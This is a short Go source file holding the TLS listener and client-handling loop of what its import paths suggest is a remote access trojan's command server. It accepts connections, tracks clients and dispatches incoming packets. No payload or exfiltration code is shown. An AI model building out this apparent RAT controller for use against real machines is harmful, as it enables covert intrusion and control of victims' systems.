package networking

import (
	"crypto/tls"
	"fmt"
	"rat/command/client"
	"rat/command/packets/incoming"
)

var (
	// Clients are all connected clients to this server
	Clients []*client.Client
)

type Server struct {
	Address string
}

func Listen(server *Server) error {
	cert, _ := tls.LoadX509KeyPair("cert.pem", "private.key")
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	listener, _ := tls.Listen("tcp", server.Address, &config)

	for {
		conn, err := listener.Accept()

		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		var client client.Client
		client.Conn = conn
		Clients = append(Clients, &client)
		go handleClient(&client)
	}
}

func handleClient(client *client.Client) {
	for {
		header, err := client.ReadHeader()

		if err != nil {
			break
		}

		packet := incoming.GetPacket(header)
		err = packet.Read(client)

		if err != nil {
			break
		}
	}
}
